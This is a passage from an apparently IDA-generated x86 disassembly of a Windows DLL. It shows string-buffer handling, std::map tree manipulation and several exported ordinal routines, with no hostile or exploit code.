arg_0		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+arg_0]
		mov	ecx, [esi]
		mov	eax, [ecx]
		push	edi
		call	dword ptr [eax+10h]
		lea	edx, [esi+0Ch]
		cmp	dword ptr [edx], 0
		jl	short loc_6AF3164B
		cmp	eax, [esi]
		jnz	short loc_6AF3164B
		xor	eax, eax
		mov	edi, esi
		inc	eax
		lock xadd [edx], eax
		jmp	short loc_6AF3167C
; ---------------------------------------------------------------------------

loc_6AF3164B:				; CODE XREF: sub_6AF31627+13j
					; sub_6AF31627+17j
		mov	edx, [eax]
		push	1
		push	dword ptr [esi+4]
		mov	ecx, eax
		call	dword ptr [edx]
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF31661
		jmp	sub_6AF31583
; ---------------------------------------------------------------------------

loc_6AF31661:				; CODE XREF: sub_6AF31627+33j
		mov	eax, [esi+4]
		mov	[edi+4], eax
		mov	eax, [esi+4]
		inc	eax
		push	eax		; Size
		add	esi, 10h
		lea	eax, [edi+10h]
		push	esi		; Src
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF3167C:				; CODE XREF: sub_6AF31627+22j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_6AF31627	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31681	proc near		; CODE XREF: Ordinal149+B7p
					; sub_6AF31E92+52p ...
		mov	eax, [ecx]
		push	ebx
		xor	bl, bl
		cmp	[eax+15h], bl
		jnz	short loc_6AF316B5
		mov	edx, [eax+8]
		cmp	[edx+15h], bl
		jnz	short loc_6AF316AB
		jmp	short loc_6AF31697
; ---------------------------------------------------------------------------

loc_6AF31695:				; CODE XREF: sub_6AF31681+1Bj
		mov	edx, eax

loc_6AF31697:				; CODE XREF: sub_6AF31681+12j
		mov	eax, [edx]
		cmp	[eax+15h], bl
		jz	short loc_6AF31695
		mov	[ecx], edx
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_6AF316A2:				; CODE XREF: sub_6AF31681+30j
		mov	edx, [ecx]
		cmp	edx, [eax+8]
		jnz	short loc_6AF316B3
		mov	[ecx], eax

loc_6AF316AB:				; CODE XREF: sub_6AF31681+10j
		mov	eax, [eax+4]
		cmp	[eax+15h], bl
		jz	short loc_6AF316A2

loc_6AF316B3:				; CODE XREF: sub_6AF31681+26j
		mov	[ecx], eax

loc_6AF316B5:				; CODE XREF: sub_6AF31681+8j
		pop	ebx
		retn
sub_6AF31681	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF316B7	proc near		; CODE XREF: sub_6AF31898+9p
					; sub_6AF32BDF+37p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	eax, [eax]
		push	esi
		sub	eax, 10h
		push	eax
		mov	esi, ecx
		call	sub_6AF31627
		add	eax, 10h
		mov	[esi], eax
		pop	ecx
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF316B7	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF316D5	proc near		; CODE XREF: sub_6AF31CCD+100p
					; sub_6AF31CCD+116p ...

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		mov	eax, [edx]
		push	esi
		mov	esi, [eax+8]
		mov	[edx], esi
		mov	esi, [eax+8]
		cmp	byte ptr [esi+15h], 0
		jnz	short loc_6AF316ED
		mov	[esi+4], edx

loc_6AF316ED:				; CODE XREF: sub_6AF316D5+13j
		mov	esi, [edx+4]
		mov	[eax+4], esi
		mov	ecx, [ecx+4]
		cmp	edx, [ecx+4]
		pop	esi
		jnz	short loc_6AF31701
		mov	[ecx+4], eax
		jmp	short loc_6AF31710
; ---------------------------------------------------------------------------

loc_6AF31701:				; CODE XREF: sub_6AF316D5+25j
		mov	ecx, [edx+4]
		cmp	edx, [ecx+8]
		jnz	short loc_6AF3170E
		mov	[ecx+8], eax
		jmp	short loc_6AF31710
; ---------------------------------------------------------------------------

loc_6AF3170E:				; CODE XREF: sub_6AF316D5+32j
		mov	[ecx], eax

loc_6AF31710:				; CODE XREF: sub_6AF316D5+2Aj
					; sub_6AF316D5+37j
		mov	[eax+8], edx
		mov	[edx+4], eax
		retn	4
sub_6AF316D5	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF31719	proc near		; CODE XREF: sub_6AF31851+1Ap

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		mov	esi, [ecx]
		mov	ebx, [esi-0Ch]
		sub	esi, 10h
		mov	[ebp+var_8], ecx
		mov	ecx, [esi]
		mov	eax, [ecx]
		push	edi
		mov	[ebp+var_4], ebx
		call	dword ptr [eax+10h]
		mov	edx, [eax]
		push	1
		push	[ebp+arg_0]
		mov	ecx, eax
		call	dword ptr [edx]
		mov	edi, eax
		test	edi, edi
		jnz	short loc_6AF3174C
		call	sub_6AF31583
; ---------------------------------------------------------------------------

loc_6AF3174C:				; CODE XREF: sub_6AF31719+2Cj
		mov	eax, [ebp+arg_0]
		cmp	ebx, eax
		jge	short loc_6AF31755
		mov	eax, ebx

loc_6AF31755:				; CODE XREF: sub_6AF31719+38j
		inc	eax
		push	eax		; Size
		lea	eax, [esi+10h]
		push	eax		; Src
		lea	ebx, [edi+10h]
		push	ebx		; Dst
		call	memcpy
		mov	eax, [ebp+var_4]
		add	esp, 0Ch
		mov	ecx, esi
		mov	[edi+4], eax
		call	sub_6AF3160D
		mov	eax, [ebp+var_8]
		pop	edi
		pop	esi
		mov	[eax], ebx
		pop	ebx
		leave
		retn	4
sub_6AF31719	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31780	proc near		; CODE XREF: sub_6AF31851+3Ep

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		push	1
		push	[esp+8+arg_0]
		sub	eax, 10h
		mov	ecx, [eax]
		mov	edx, [ecx]
		push	eax
		call	dword ptr [edx+8]
		test	eax, eax
		jnz	short loc_6AF3179F
		call	sub_6AF31583
; ---------------------------------------------------------------------------

loc_6AF3179F:				; CODE XREF: sub_6AF31780+18j
		add	eax, 10h
		mov	[esi], eax
		pop	esi
		retn	4
sub_6AF31780	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF317A8	proc near		; CODE XREF: sub_6AF31A5C+Cp
					; Ordinal145+8p ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		lea	ecx, [eax-10h]
		xor	edx, edx
		cmp	[ecx+4], edx
		push	edi
		mov	edi, [ecx]
		jz	short loc_6AF317E8
		cmp	[ecx+0Ch], edx
		jge	short loc_6AF317D7
		cmp	[eax-8], edx
		jge	short loc_6AF317CE
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF317CE:				; CODE XREF: sub_6AF317A8+1Aj
		mov	[eax-0Ch], edx
		mov	eax, [esi]
		mov	[eax], dl
		jmp	short loc_6AF317E8
; ---------------------------------------------------------------------------

loc_6AF317D7:				; CODE XREF: sub_6AF317A8+15j
		call	sub_6AF3160D
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+0Ch]
		add	eax, 10h
		mov	[esi], eax

loc_6AF317E8:				; CODE XREF: sub_6AF317A8+10j
					; sub_6AF317A8+2Dj
		pop	edi
		pop	esi
		retn
sub_6AF317A8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_6AF317EB	proc near		; CODE XREF: sub_6AF318B3+3j
					; sub_6AF52E06+3j
		jmp	sub_6AF3789B
sub_6AF317EB	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF317F0	proc near		; CODE XREF: sub_6AF3CDE8+90p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		add	eax, 10h
		mov	[esi], eax
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF317F0	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31807	proc near		; CODE XREF: sub_6AF318DC+14p
					; sub_6AF321FB+22p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		mov	eax, [eax]
		mov	ecx, [esp+arg_0]
		mov	ecx, [ecx]
		push	eax		; unsigned __int8 *
		push	ecx		; unsigned __int8 *
		call	ds:_mbscmp
		pop	ecx
		pop	ecx
		xor	ecx, ecx
		test	eax, eax
		setl	cl
		mov	al, cl
		retn
sub_6AF31807	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31827	proc near		; CODE XREF: sub_6AF45C0E+3p
		push	18h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		xor	edx, edx
		cmp	eax, edx
		pop	ecx
		jz	short loc_6AF31837
		mov	[eax], edx

loc_6AF31837:				; CODE XREF: sub_6AF31827+Cj
		lea	ecx, [eax+4]
		cmp	ecx, edx
		jz	short loc_6AF31840
		mov	[ecx], edx

loc_6AF31840:				; CODE XREF: sub_6AF31827+15j
		lea	ecx, [eax+8]
		cmp	ecx, edx
		jz	short loc_6AF31849
		mov	[ecx], edx

loc_6AF31849:				; CODE XREF: sub_6AF31827+1Ej
		mov	byte ptr [eax+14h], 1
		mov	[eax+15h], dl
		retn
sub_6AF31827	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31851	proc near		; CODE XREF: sub_6AF31911+1Fp

arg_0		= dword	ptr  4

		mov	eax, [ecx]
		mov	edx, [eax-0Ch]
		sub	eax, 10h
		push	esi
		mov	esi, [esp+4+arg_0]
		cmp	edx, esi
		jle	short loc_6AF31864
		mov	esi, edx

loc_6AF31864:				; CODE XREF: sub_6AF31851+Fj
		cmp	dword ptr [eax+0Ch], 1
		jle	short loc_6AF31872
		push	esi
		call	sub_6AF31719
		jmp	short loc_6AF31894
; ---------------------------------------------------------------------------

loc_6AF31872:				; CODE XREF: sub_6AF31851+17j
		mov	eax, [eax+8]
		cmp	eax, esi
		jge	short loc_6AF31894
		mov	edx, 400h
		cmp	eax, edx
		jle	short loc_6AF31886
		add	eax, edx
		jmp	short loc_6AF31888
; ---------------------------------------------------------------------------

loc_6AF31886:				; CODE XREF: sub_6AF31851+2Fj
		add	eax, eax

loc_6AF31888:				; CODE XREF: sub_6AF31851+33j
		cmp	eax, esi
		jge	short loc_6AF3188E
		mov	eax, esi

loc_6AF3188E:				; CODE XREF: sub_6AF31851+39j
		push	eax
		call	sub_6AF31780

loc_6AF31894:				; CODE XREF: sub_6AF31851+1Fj
					; sub_6AF31851+26j
		pop	esi
		retn	4
sub_6AF31851	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31898	proc near		; CODE XREF: sub_6AF3193B+1Dp

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		push	edi
		mov	esi, ecx
		call	sub_6AF316B7
		mov	eax, [edi+4]
		mov	[esi+4], eax
		pop	edi
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF31898	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF318B3	proc near		; CODE XREF: sub_6AF321C2+1Fp
		add	ecx, 0Ch
		jmp	sub_6AF317EB
sub_6AF318B3	endp

; Exported entry 142.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal142
Ordinal142	proc near		; CODE XREF: Ordinal140+Cp
					; DATA XREF: .rdata:off_6AF66098o
		add	ecx, 24h
		jmp	sub_6AF3789B
Ordinal142	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF318C3	proc near		; CODE XREF: Ordinal139+6p
					; Ordinal148+BBp ...
		mov	eax, dword_6AF682CC
		push	esi
		mov	esi, ecx
		mov	ecx, offset dword_6AF682CC
		call	dword ptr [eax+0Ch]
		add	eax, 10h
		mov	[esi], eax
		mov	eax, esi
		pop	esi
		retn
sub_6AF318C3	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF318DC	proc near		; CODE XREF: sub_6AF32BDF+13p

arg_0		= dword	ptr  4

		mov	eax, [ecx+4]
		push	esi
		mov	esi, [eax+4]
		push	edi
		mov	edi, eax
		jmp	short loc_6AF31904
; ---------------------------------------------------------------------------

loc_6AF318E8:				; CODE XREF: sub_6AF318DC+2Cj
		push	[esp+8+arg_0]
		lea	eax, [esi+0Ch]
		push	eax
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	short loc_6AF31900
		mov	esi, [esi+8]
		jmp	short loc_6AF31904
; ---------------------------------------------------------------------------

loc_6AF31900:				; CODE XREF: sub_6AF318DC+1Dj
		mov	edi, esi
		mov	esi, [esi]

loc_6AF31904:				; CODE XREF: sub_6AF318DC+Aj
					; sub_6AF318DC+22j
		cmp	byte ptr [esi+15h], 0
		jz	short loc_6AF318E8
		mov	eax, edi
		pop	edi
		pop	esi
		retn	4
sub_6AF318DC	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31911	proc near		; CODE XREF: sub_6AF31A5C+32p
					; sub_6AF31AC4+32p ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	eax, [esi]
		xor	ecx, ecx
		sub	eax, 10h
		inc	ecx
		sub	ecx, [eax+0Ch]
		mov	eax, [eax+8]
		sub	eax, [esp+4+arg_0]
		or	ecx, eax
		jge	short loc_6AF31935
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	sub_6AF31851

loc_6AF31935:				; CODE XREF: sub_6AF31911+17j
		mov	eax, [esi]
		pop	esi
		retn	4
sub_6AF31911	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3193B	proc near		; CODE XREF: sub_6AF31B42+40p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		push	esi
		push	[ebp+arg_C]
		mov	esi, ecx
		mov	[esi], eax
		mov	eax, [ebp+arg_4]
		mov	[esi+4], eax
		mov	eax, [ebp+arg_8]
		lea	ecx, [esi+0Ch]
		mov	[esi+8], eax
		call	sub_6AF31898
		mov	al, [ebp+arg_10]
		mov	[esi+14h], al
		mov	byte ptr [esi+15h], 0
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	14h
sub_6AF3193B	endp

; Exported entry 139.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal139
Ordinal139	proc near		; CODE XREF: Ordinal137+14p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+24h]
		call	sub_6AF318C3
		mov	eax, esi
		pop	esi
		retn
Ordinal139	endp

; Exported entry 149.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal149
Ordinal149	proc near		; CODE XREF: Ordinal154+15p
					; Ordinal155+3Dp
					; DATA XREF: ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		test	edi, edi
		mov	esi, ecx
		jnz	short loc_6AF31993
		xor	eax, eax
		jmp	loc_6AF31A56
; ---------------------------------------------------------------------------

loc_6AF31993:				; CODE XREF: Ordinal149+Dj
		push	dword ptr [esi+4]
		mov	ecx, edi
		mov	[ebp+var_4], 1
		call	Ordinal649
		push	dword ptr [esi+0Ch]
		mov	ecx, edi
		call	Ordinal661
		push	dword ptr [esi+10h]
		mov	ecx, edi
		call	Ordinal663
		push	dword ptr [esi+14h]
		mov	ecx, edi
		call	Ordinal665
		push	dword ptr [esi+18h]
		mov	ecx, edi
		call	Ordinal653
		push	dword ptr [esi+1Ch]
		mov	ecx, edi
		call	Ordinal655
		push	dword ptr [esi+20h]
		mov	ecx, edi
		call	Ordinal657
		push	dword ptr [esi+24h]
		mov	ecx, edi
		call	Ordinal659
		push	dword ptr [esi+28h]
		mov	ecx, edi
		call	Ordinal651
		mov	eax, [esi+8]
		cmp	dword ptr [eax-0Ch], 0
		jz	short loc_6AF31A0C
		push	eax		; Src
		mov	ecx, edi
		call	Ordinal669
		test	eax, eax
		jnz	short loc_6AF31A0C
		and	[ebp+var_4], eax

loc_6AF31A0C:				; CODE XREF: Ordinal149+7Ej
					; Ordinal149+8Aj
		mov	eax, [esi+30h]
		push	ebx
		mov	ebx, [eax]
		cmp	ebx, eax
		mov	[ebp+arg_0], ebx
		jz	short loc_6AF31A52

loc_6AF31A19:				; CODE XREF: Ordinal149+C2j
		mov	ecx, edi
		call	Ordinal236
		mov	ecx, [ebx+0Ch]
		push	eax		; unsigned __int8 *
		push	ecx		; unsigned __int8 *
		call	ds:_mbsicmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF31A43
		lea	ecx, [ebp+arg_0]
		call	sub_6AF31681
		mov	ebx, [ebp+arg_0]
		cmp	ebx, [esi+30h]
		jnz	short loc_6AF31A19
		jmp	short loc_6AF31A52
; ---------------------------------------------------------------------------

loc_6AF31A43:				; CODE XREF: Ordinal149+B2j
		cmp	dword ptr [ebx+10h], 0
		jnz	short loc_6AF31A52
		push	0
		mov	ecx, edi
		call	Ordinal649

loc_6AF31A52:				; CODE XREF: Ordinal149+9Aj
					; Ordinal149+C4j ...
		mov	eax, [ebp+var_4]
		pop	ebx

loc_6AF31A56:				; CODE XREF: Ordinal149+11j
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal149	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF31A5C(void *Src,	size_t Size)
sub_6AF31A5C	proc near		; CODE XREF: sub_6AF31B1D+1Bp
					; sub_6AF31C41+41p

Src		= dword	ptr  8
Size		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		cmp	[ebp+Size], 0
		push	ebx
		mov	ebx, ecx
		jnz	short loc_6AF31A6F
		call	sub_6AF317A8
		jmp	short loc_6AF31ABF
; ---------------------------------------------------------------------------

loc_6AF31A6F:				; CODE XREF: sub_6AF31A5C+Aj
		push	esi
		mov	esi, [ebp+Src]
		test	esi, esi
		jnz	short loc_6AF31A81
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF31A81:				; CODE XREF: sub_6AF31A5C+19j
		mov	eax, [ebx]
		push	edi
		push	[ebp+Size]
		mov	edi, [eax-0Ch]
		mov	ecx, ebx
		sub	esi, eax
		call	sub_6AF31911
		cmp	esi, edi
		pop	edi
		push	[ebp+Size]	; Size
		ja	short loc_6AF31AA8
		lea	ecx, [eax+esi]
		push	ecx		; Src
		push	eax		; Dst
		call	ds:memmove
		jmp	short loc_6AF31AB1
; ---------------------------------------------------------------------------

loc_6AF31AA8:				; CODE XREF: sub_6AF31A5C+3Dj
		push	[ebp+Src]	; Src
		push	eax		; Dst
		call	memcpy

loc_6AF31AB1:				; CODE XREF: sub_6AF31A5C+4Aj
		add	esp, 0Ch
		push	[ebp+Size]
		mov	ecx, ebx
		call	sub_6AF3155D
		pop	esi

loc_6AF31ABF:				; CODE XREF: sub_6AF31A5C+11j
		pop	ebx
		pop	ebp
		retn	8
sub_6AF31A5C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF31AC4(HMODULE hModule, int)
sub_6AF31AC4	proc near		; CODE XREF: sub_6AF31CA9+1Bp

var_4		= dword	ptr -4
hModule		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		push	[ebp+arg_4]	; int
		mov	[ebp+var_4], ecx
		push	[ebp+hModule]	; hModule
		call	sub_6AF314B9
		mov	esi, eax
		test	esi, esi
		pop	ecx
		pop	ecx
		jz	short loc_6AF31B18
		movzx	eax, word ptr [esi]
		push	ebx
		push	edi
		push	eax		; cchWideChar
		lea	edi, [esi+2]
		push	edi		; lpWideCharStr
		call	sub_6AF3158E
		pop	ecx
		pop	ecx
		mov	ecx, [ebp+var_4]
		mov	ebx, eax
		push	ebx
		call	sub_6AF31911
		movzx	ecx, word ptr [esi]
		push	ecx		; cchWideChar
		push	edi		; lpWideCharStr
		push	ebx		; cbMultiByte
		push	eax		; lpMultiByteStr
		call	sub_6AF315AB
		mov	ecx, [ebp+var_4]
		add	esp, 10h
		push	ebx
		call	sub_6AF3155D
		xor	eax, eax
		pop	edi
		inc	eax
		pop	ebx

loc_6AF31B18:				; CODE XREF: sub_6AF31AC4+19j
		pop	esi
		leave
		retn	8
sub_6AF31AC4	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF31B1D(char *Src)
sub_6AF31B1D	proc near		; CODE XREF: sub_6AF3260A+3Ap
					; Ordinal172+6Dp ...

Src		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+Src]
		test	esi, esi
		push	edi
		mov	edi, ecx
		jnz	short loc_6AF31B2D
		xor	eax, eax
		jmp	short loc_6AF31B34
; ---------------------------------------------------------------------------

loc_6AF31B2D:				; CODE XREF: sub_6AF31B1D+Aj
		push	esi		; Str
		call	strlen
		pop	ecx

loc_6AF31B34:				; CODE XREF: sub_6AF31B1D+Ej
		push	eax		; Size
		push	esi		; Src
		mov	ecx, edi
		call	sub_6AF31A5C
		pop	edi
		pop	esi
		retn	4
sub_6AF31B1D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF31B42	proc near		; CODE XREF: sub_6AF31CCD+5Ep

var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		mov	eax, offset unknown_libname_19 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	18h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		and	[ebp+var_4], 0
		mov	esi, eax
		pop	ecx
		mov	[ebp+var_14], esi
		mov	[ebp+var_18], esi
		test	esi, esi
		mov	byte ptr [ebp+var_4], 1
		jz	short loc_6AF31B87
		push	[ebp+arg_10]
		mov	ecx, esi
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3193B

loc_6AF31B87:				; CODE XREF: sub_6AF31B42+2Dj
		mov	ecx, [ebp+var_C]
		pop	edi
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	14h
sub_6AF31B42	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

sub_6AF31B9A	proc near		; DATA XREF: .rdata:6AF61E00o
		push	dword ptr [ebp-14h] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		push	0
		push	0
		call	_CxxThrowException
sub_6AF31B9A	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF31BAD(char *Format, va_list Args)
sub_6AF31BAD	proc near		; CODE XREF: sub_6AF3218F+Dp
					; Ordinal640+F4p

Format		= dword	ptr  4
Args		= dword	ptr  8

		push	ebx
		push	esi
		push	edi
		push	[esp+0Ch+Args]	; ArgList
		mov	edi, ecx
		mov	eax, [edi]
		push	[esp+10h+Format] ; Format
		mov	esi, [eax-0Ch]
		call	ds:_vscprintf
		pop	ecx
		pop	ecx
		lea	ebx, [eax+esi]
		push	ebx
		mov	ecx, edi
		call	sub_6AF31911
		push	[esp+0Ch+Args]	; Args
		add	eax, esi
		push	[esp+10h+Format] ; Format
		push	eax		; Dest
		call	ds:vsprintf
		add	esp, 0Ch
		push	ebx
		mov	ecx, edi
		call	sub_6AF3155D
		pop	edi
		pop	esi
		pop	ebx
		retn	8
sub_6AF31BAD	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF31BF4(char *Format, va_list Args)
sub_6AF31BF4	proc near		; CODE XREF: sub_6AF3217C+Dp
					; Ordinal393+46p ...

Format		= dword	ptr  8
Args		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		cmp	[ebp+Format], 0
		push	esi
		push	edi
		mov	edi, ecx
		jnz	short loc_6AF31C0B
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF31C0B:				; CODE XREF: sub_6AF31BF4+Bj
		push	[ebp+Args]	; ArgList
		push	[ebp+Format]	; Format
		call	ds:_vscprintf
		pop	ecx
		pop	ecx
		mov	esi, eax
		push	esi
		mov	ecx, edi
		call	sub_6AF31911
		push	[ebp+Args]	; Args
		push	[ebp+Format]	; Format
		push	eax		; Dest
		call	ds:vsprintf
		add	esp, 0Ch
		push	esi
		mov	ecx, edi
		call	sub_6AF3155D
		pop	edi
		pop	esi
		pop	ebp
		retn	8
sub_6AF31BF4	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31C41	proc near		; CODE XREF: Ordinal148+122p
					; Ordinal188+EAp ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	eax, [eax]
		push	esi
		push	edi
		mov	edi, ecx
		mov	esi, [edi]
		lea	ecx, [eax-10h]
		sub	esi, 10h
		cmp	ecx, esi
		jz	short loc_6AF31C87
		cmp	dword ptr [esi+0Ch], 0
		jl	short loc_6AF31C7C
		mov	edx, [ecx]
		cmp	edx, [esi]
		jnz	short loc_6AF31C7C
		push	ebx
		push	ecx
		call	sub_6AF31627
		pop	ecx
		mov	ecx, esi
		mov	ebx, eax
		call	sub_6AF3160D
		add	ebx, 10h
		mov	[edi], ebx
		pop	ebx
		jmp	short loc_6AF31C87
; ---------------------------------------------------------------------------

loc_6AF31C7C:				; CODE XREF: sub_6AF31C41+1Aj
					; sub_6AF31C41+20j
		push	dword ptr [eax-0Ch] ; Size
		mov	ecx, edi
		push	eax		; Src
		call	sub_6AF31A5C

loc_6AF31C87:				; CODE XREF: sub_6AF31C41+14j
					; sub_6AF31C41+39j
		mov	eax, edi
		pop	edi
		pop	esi
		retn	4
sub_6AF31C41	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31C8E	proc near		; CODE XREF: sub_6AF3213B+35p
					; sub_6AF3B17D+52p

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	sub_6AF31911
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	sub_6AF3155D
		pop	esi
		retn	4
sub_6AF31C8E	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31CA9	proc near		; CODE XREF: sub_6AF321A2+16p

arg_0		= dword	ptr  4

		push	esi
		push	0		; wLanguage
		push	[esp+8+arg_0]	; int
		mov	esi, ecx
		call	sub_6AF3151B
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF31CC9
		push	[esp+4+arg_0]	; int
		mov	ecx, esi
		push	eax		; hModule
		call	sub_6AF31AC4

loc_6AF31CC9:				; CODE XREF: sub_6AF31CA9+12j
		pop	esi
		retn	4
sub_6AF31CA9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF31CCD	proc near		; CODE XREF: sub_6AF321FB+59p
					; sub_6AF32680+19p ...

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	eax, offset unknown_libname_20 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		cmp	dword ptr [edi+8], 1FFFFFFEh
		jb	short loc_6AF31D1B
		push	offset aMapSetTTooLong ; "map/set<T> too long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF31D1B:				; CODE XREF: sub_6AF31CCD+19j
		mov	eax, [edi+4]
		mov	esi, [ebp+arg_8]
		push	0
		push	[ebp+arg_C]
		mov	ecx, edi
		push	eax
		push	esi
		push	eax
		call	sub_6AF31B42
		inc	dword ptr [edi+8]
		mov	ebx, eax
		mov	eax, [edi+4]
		cmp	esi, eax
		jnz	short loc_6AF31D49
		mov	[eax+4], ebx
		mov	eax, [edi+4]
		mov	[eax], ebx
		mov	eax, [edi+4]
		jmp	short loc_6AF31D67
; ---------------------------------------------------------------------------

loc_6AF31D49:				; CODE XREF: sub_6AF31CCD+6Dj
		cmp	[ebp+arg_4], 0
		jz	short loc_6AF31D5C
		mov	[esi], ebx
		mov	eax, [edi+4]
		cmp	esi, [eax]
		jnz	short loc_6AF31D6A
		mov	[eax], ebx
		jmp	short loc_6AF31D6A
; ---------------------------------------------------------------------------

loc_6AF31D5C:				; CODE XREF: sub_6AF31CCD+80j
		mov	[esi+8], ebx
		mov	eax, [edi+4]
		cmp	esi, [eax+8]
		jnz	short loc_6AF31D6A

loc_6AF31D67:				; CODE XREF: sub_6AF31CCD+7Aj
		mov	[eax+8], ebx

loc_6AF31D6A:				; CODE XREF: sub_6AF31CCD+89j
